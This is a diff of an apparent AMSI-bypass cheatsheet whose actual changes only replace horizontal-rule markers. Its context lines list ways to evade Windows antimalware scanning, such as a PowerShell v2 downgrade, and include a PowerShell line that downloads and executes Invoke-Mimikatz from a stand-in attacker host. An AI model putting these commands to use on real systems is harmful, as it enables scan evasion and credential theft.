@@ -26,7 +26,7 @@ linked:
 ---
 # AMSI Bypasses
 
-***
+---
 
 ## Cheatsheet
 ^amsi-bypasses
@@ -41,7 +41,7 @@ linked:
 | **PowerShell v2** | Legacy Windows sin AMSI |
 | **Binary loader (Invoke-Binary)** | Saltar PowerShell entirely |
 
-***
+---
 
 ## Concepto
 
@@ -245,4 +245,4 @@ iex (new-object net.webclient).downloadstring('http://atk/Invoke-Mimikatz.ps1')
 - [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
 - [S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
 
-***
+---
